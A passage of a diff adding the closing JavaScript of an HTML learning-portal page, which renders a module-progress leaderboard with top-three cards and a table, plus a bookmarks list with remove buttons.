+  var sorted = LB.slice().sort(function(a, b) { return b.mods - a.mods || b.quiz - a.quiz; });
+  var crowns = ['#1', '#2', '#3'];
+  var rankCls = ['r1', 'r2', 'r3'];
+  var top3 = document.getElementById('top3');
+  top3.innerHTML = '';
+  sorted.slice(0, 3).forEach(function(p, i) {
+    var card = el('div', 't3-card' + (i === 0 ? ' first' : ''));
+    card.appendChild(el('div', 't3-crown', crowns[i]));
+    var av = el('div', 't3-av', p.av);
+    av.style.background = p.color + '33'; av.style.color = p.color;
+    card.appendChild(av);
+    card.appendChild(el('div', 't3-name', p.name));
+    card.appendChild(el('div', 't3-mods', p.mods + '/9 modules'));
+    card.appendChild(el('div', 't3-score', p.quiz + '%'));
+    top3.appendChild(card);
+  });
+  var tbody = document.getElementById('lbBody');
+  tbody.innerHTML = '';
+  sorted.forEach(function(p, i) {
+    var tr = document.createElement('tr');
+    var tdR = document.createElement('td');
+    tdR.appendChild(el('span', 'lb-rank ' + (rankCls[i] || 'rn'), String(i + 1)));
+    tr.appendChild(tdR);
+    var tdN = document.createElement('td');
+    var nc = el('div', 'lb-nc');
+    var av = el('div', 'lb-av', p.av);
+    av.style.background = p.color + '33'; av.style.color = p.color;
+    nc.appendChild(av);
+    var nd = el('div', '');
+    var nm = el('div', '', p.name); nm.style.fontWeight = '600';
+    nd.appendChild(nm);
+    nd.appendChild(el('div', 'lb-role', p.role));
+    nc.appendChild(nd); tdN.appendChild(nc); tr.appendChild(tdN);
+    var tdM = document.createElement('td');
+    tdM.style.cssText = "font-family:'JetBrains Mono',monospace;color:#00C9E4";
+    tdM.textContent = p.mods + '/9'; tr.appendChild(tdM);
+    var tdP = document.createElement('td');
+    var bw = el('div', 'lb-bar-w'); var bar = el('div', 'lb-bar');
+    bar.style.width = Math.round(p.mods / 9 * 100) + '%';
+    bw.appendChild(bar); tdP.appendChild(bw); tr.appendChild(tdP);
+    var tdQ = document.createElement('td');
+    tdQ.style.cssText = "font-family:'JetBrains Mono',monospace;font-weight:600;color:" + (p.quiz >= 90 ? '#2ECC71' : p.quiz >= 75 ? '#00C9E4' : '#8FA3B8');
+    tdQ.textContent = p.quiz + '%'; tr.appendChild(tdQ);
+    var tdB = document.createElement('td');
+    tdB.appendChild(el('span', 'lb-bdg ' + p.bdg, p.bdgt)); tr.appendChild(tdB);
+    tbody.appendChild(tr);
+  });
+}
+
+function renderBookmarks() {
+  var content = document.getElementById('bmContent');
+  content.innerHTML = '';
+  if (S.bm.size === 0) {
+    content.appendChild(el('div', 'bm-empty', 'No bookmarks yet. Click the star on any module to save it here.'));
+    return;
+  }
+  var list = el('div', 'bm-list');
+  Array.from(S.bm).forEach(function(num) {
+    var mod = MODS.find(function(m) { return m.num === num; });
+    if (!mod) return;
+    var item = el('div', 'bm-item');
+    item.addEventListener('click', function() {
+      document.querySelectorAll('.nav-tab').forEach(function(b) { b.classList.remove('active'); });
+      document.querySelector('[data-page="modules"]').classList.add('active');
+      document.querySelectorAll('.page').forEach(function(p) { p.classList.remove('active'); });
+      document.getElementById('page-modules').classList.add('active');
+      renderModules('all');
+    });
+    var pin = el('div', ''); pin.innerHTML = '&#9733;';
+    pin.style.cssText = 'font-size:20px;flex-shrink:0;color:#F1C40F;';
+    var info = el('div', 'bm-info');
+    info.appendChild(el('div', 'bm-title', mod.title));
+    info.appendChild(el('div', 'bm-meta', 'Module ' + String(num).padStart(2,'0') + ' - ' + mod.level + ' - ' + mod.dur));
+    var rmBtn = el('button', 'bm-rm'); rmBtn.innerHTML = '&#215;';
+    rmBtn.addEventListener('click', function(ev) {
+      ev.stopPropagation(); S.bm.delete(num); saveState(); renderBookmarks();
+    });
+    item.appendChild(pin); item.appendChild(info); item.appendChild(rmBtn);
+    list.appendChild(item);
+  });
+  content.appendChild(list);
+}
+
+renderModules('all');
+updateProgress();
+renderGlossary('');
+renderLeaderboard();
+</script>
+
+</body>
+</html>
